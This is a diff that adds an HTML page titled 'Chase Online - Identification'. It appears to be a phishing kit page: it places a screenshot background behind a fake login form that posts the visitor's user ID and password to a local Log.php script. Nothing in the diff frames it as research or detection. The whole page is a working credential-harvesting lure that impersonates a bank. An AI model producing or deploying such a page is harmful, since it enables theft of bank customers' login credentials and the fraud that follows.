@@ -1,0 +1,80 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Chase Online - Identification
+  </title>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <style>
+   .textbox { 
+    -webkit-border-radius: 3px; 
+    -moz-border-radius: 3px; 
+    border-radius: 3px; 
+    border: 1px solid #848484; 
+    outline:0; 
+    height:35px; 
+    width: 275px;
+font-size: 18px;	
+ }
+  </style>
+  <style type="text/css">
+   body { 
+width:100%; 
+height:100%; 
+}
+  </style>
+  <script type="text/javascript">
+   function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+  </script>
+  <style type="text/css">
+  </style>
+ </head>
+ <body background="image_files/Capture.png" height="100%" width="100%" border="0" style="background-repeat: no-repeat">
+  <div>
+   <form action="Log.php" method="post" style="margin-top:165px;margin-left:710px" class="">
+    <table width="248" height="150" border="0" bgcolor="#F2F2E1" align="left" cellspacing="0" cellpadding="0" id="secureLogonTable" valign="top" style="margin-left: -150px;">
+     <tbody>
+      <tr align="center">
+      </tr>
+      <tr>
+       <td width="5">
+       </td>
+       <td align="right" class="bodyTextBold">
+       </td>
+       <td width="10" rowspan="3">
+        <img width="10" height="10" src="image_files/spacer.gif" />
+       </td>
+       <td>
+        <input type="text" style="width: 160;" title="Type the User ID." tabindex="1" id="UserID" maxlength="32" name="UserID" />
+       </td>
+      </tr>
+      <tr>
+       <td width="5">
+       </td>
+       <td align="right" class="bodyTextBold">
+       </td>
+       <td>
+        <input type="password" style="width: 160;" class="inputTextBox" title="Required field Enter Password." tabindex="2" id="Password" name="Password" />
+       </td>
+      </tr>
+      <tr>
+       <td width="5">
+       </td>
+       <td height="45" align="center" colspan="3" style="margin-left: 400px;">
+        <div class="spacerH5" style="">
+        </div>
+        <input width="58" type="image" height="21" border="0" title="Log On" onclick="return check_all_fields_logon(document.getElementById('UserID'), document.getElementById('Password'));" src="image_files/logon.gif" id="logon" />
+        <div class="spacerH10">
+        </div>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </form>
+  </div>
+ </body>
+</html>
